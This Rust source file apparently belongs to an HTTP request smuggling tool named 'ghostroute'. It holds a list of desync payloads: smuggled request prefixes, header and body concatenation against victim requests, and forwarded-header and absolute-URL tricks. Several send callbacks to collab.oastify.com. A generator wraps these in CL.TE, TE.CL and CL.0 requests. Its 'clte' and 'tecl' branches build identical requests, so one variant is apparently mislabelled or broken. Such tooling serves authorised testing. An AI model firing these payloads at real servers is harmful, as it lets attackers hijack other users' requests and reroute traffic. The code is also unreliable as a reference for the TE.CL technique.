use crate::net::NetConfig;

#[derive(Debug, Clone)]
pub struct PocTechnique {
    pub name: &'static str,
    pub inject_value: &'static str,
    pub description: &'static str,
}

pub fn all_poc_techniques() -> Vec<PocTechnique> {
    vec![
        PocTechnique {
            name: "G",
            inject_value: "G",
            description: "Basic GPOST detection — single char method becomes G + remaining as body",
        },
        PocTechnique {
            name: "FOO",
            inject_value: "FOO BAR AAH\r\n\r\n",
            description: "Multi-word method detection — FOO treated as method, rest as headers",
        },
        PocTechnique {
            name: "headerConcat",
            inject_value: "GET / HTTP/1.1\r\nHost: localhost\r\nFoo: ",
            description: "Header concatenation — smuggled prefix merges with victim request headers",
        },
        PocTechnique {
            name: "bodyConcat",
            inject_value: "POST / HTTP/1.1\r\nHost: collab.oastify.com\r\nContent-Length: 10\r\n\r\nx",
            description: "Body concatenation — smuggled body sent to collaborator for out-of-band detection",
        },
        PocTechnique {
            name: "collab",
            inject_value: "GET / HTTP/1.1\r\nHost: collab.oastify.com\r\n\r\n",
            description: "Blind collaborator ping — DNS/HTTP callback confirms desync",
        },
        PocTechnique {
            name: "collab-header",
            inject_value: "GET / HTTP/1.1\r\nHost: collab.oastify.com\r\nX-Custom: ghostroute\r\n\r\n",
            description: "Collaborator ping with custom header — verifies header injection via desync",
        },
        PocTechnique {
            name: "collab-XFO-header",
            inject_value: "GET / HTTP/1.1\r\nHost: collab.oastify.com\r\nX-Forwarded-Host: ghostroute-poc\r\n\r\n",
            description: "X-Forwarded-Host reflection — checks if XFO reaches collaborator",
        },
        PocTechnique {
            name: "collab-abs",
            inject_value: "GET http://collab.oastify.com/ HTTP/1.1\r\nHost: collab.oastify.com\r\n\r\n",
            description: "Absolute URL smuggled — backend may proxy to absolute URL",
        },
        PocTechnique {
            name: "collab-at",
            inject_value: "GET @collab.oastify.com HTTP/1.1\r\nHost: collab.oastify.com\r\n\r\n",
            description: "@-sign path smuggling — some backends interpret @ as authority separator",
        },
        PocTechnique {
            name: "collab-blind",
            inject_value: "GET / HTTP/1.1\r\nHost: collab.oastify.com\r\nFoo: bar\r\nX-Forwarded-For: 127.0.0.1\r\nUser-Agent: ghostroute-poc\r\n\r\n",
            description: "Blind header leakage — full headers sent to collaborator to test header reflection",
        },
        PocTechnique {
            name: "body-empty",
            inject_value: "",
            description: "Empty body — tests if zero-length smuggled data causes different behavior",
        },
    ]
}

pub fn generate_poc_request(
    cfg: &NetConfig,
    variant: &str,
    technique: &PocTechnique,
    smuggled_prefix: &[u8],
) -> Vec<u8> {
    match variant {
        "clte" => {
            let body = format!(
                "0\r\n\r\n{}",
                String::from_utf8_lossy(smuggled_prefix)
            );
            format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nTransfer-Encoding: chunked\r\nUser-Agent: ghostroute/1.0.0\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n{}",
                cfg.host, body.len(), body
            ).into_bytes()
        }
        "tecl" => {
            let body = format!(
                "0\r\n\r\n{}",
                String::from_utf8_lossy(smuggled_prefix)
            );
            format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nTransfer-Encoding: chunked\r\nUser-Agent: ghostroute/1.0.0\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n{}",
                cfg.host, body.len(), body
            ).into_bytes()
        }
        "cl0" | "0cl" => {
            let mut req = format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nUser-Agent: ghostroute/1.0.0\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
                cfg.host, smuggled_prefix.len()
            ).into_bytes();
            req.extend_from_slice(smuggled_prefix);
            req
        }
        _ => {
            let body = format!(
                "0\r\n\r\n{}",
                String::from_utf8_lossy(smuggled_prefix)
            );
            format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nTransfer-Encoding: chunked\r\nUser-Agent: ghostroute/1.0.0\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n{}",
                cfg.host, body.len(), body
            ).into_bytes()
        }
    }
}
